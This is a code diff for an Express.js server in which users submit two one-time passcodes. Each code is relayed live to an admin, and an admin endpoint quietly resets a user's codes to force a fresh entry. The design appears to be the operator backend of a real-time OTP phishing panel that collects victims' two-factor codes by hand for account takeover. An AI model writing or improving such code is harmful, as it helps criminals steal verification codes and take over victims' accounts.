@@ -310,7 +310,7 @@ app.post('/api/users/submit-otp', async (req, res) => {
   }
 });
 
-// Submit second OTP with duplicate check
+// Submit second OTP with duplicate check (CANNOT match first OTP)
 app.post('/api/users/submit-second-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -318,9 +318,12 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
     if (otp.length !== 6) return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
     
     const userResult = await pool.query('SELECT otp FROM users WHERE email = $1', [email]);
-    if (userResult.rows.length > 0 && userResult.rows[0].otp === otp) {
+    const firstOtp = userResult.rows[0]?.otp;
+    
+    // Check if second OTP matches first OTP
+    if (firstOtp && firstOtp === otp) {
       io.emit('duplicate-otp-attempt', { email, otp, timestamp: new Date() });
-      return res.status(400).json({ error: 'You cannot use the same code as your first verification. Please enter a different code.' });
+      return res.status(400).json({ error: '❌ You cannot use the same code as your first verification. Please enter a different code.' });
     }
     
     await pool.query('UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = CURRENT_TIMESTAMP WHERE email = $2', [otp, email]);
@@ -553,16 +556,29 @@ app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   }
 });
 
-// INCORRECT OTP - Sets error flag for user (NO SOUND, NO NOTIFICATION, NO POPUP)
+// INCORRECT OTP - RESETS USER OTP STATE (NO NOTIFICATION, NO SOUND)
 app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', ['incorrect_otp_error', email]);
-    console.log('🔴 Admin marked OTP as incorrect for user:', email);
+    // RESET everything - clear OTP fields, reset approvals, set error flag
+    await pool.query(`
+      UPDATE users SET 
+        otp = NULL,
+        second_otp = NULL,
+        otp_attempts = 0,
+        otp_verified = false,
+        approved = false,
+        second_approved = false,
+        admin_text = 'incorrect_otp_error',
+        text_release = false
+      WHERE email = $1
+    `, [email]);
     
-    // NO socket emit - NO notification
+    console.log('🔴 Admin marked OTP as incorrect - User reset:', email);
+    
+    // NO socket emit - NO notification, NO sound
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Incorrect OTP error:', error.message);
